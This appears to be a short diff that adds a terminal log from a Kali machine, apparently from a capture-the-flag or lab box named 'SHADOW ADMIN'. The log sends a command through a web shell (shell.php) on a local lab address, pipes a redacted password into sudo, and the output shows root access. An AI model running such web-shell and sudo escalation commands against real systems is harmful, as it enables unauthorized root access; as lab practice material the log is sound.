@@ -1,0 +1,7 @@
+chifay@kali:~/SHADOW ADMIN$ curl -sS --get --data-urlencode "c=echo [REDACTADO] | sudo -S -k id 2>&1" http://172.17.0.2/shell.php
+
+<pre>[sudo] password for admin: uid=0(root) gid=0(root) groups=0(root)
+</pre>
+chifay@kali:~/SHADOW ADMIN$ exit
+
+exit
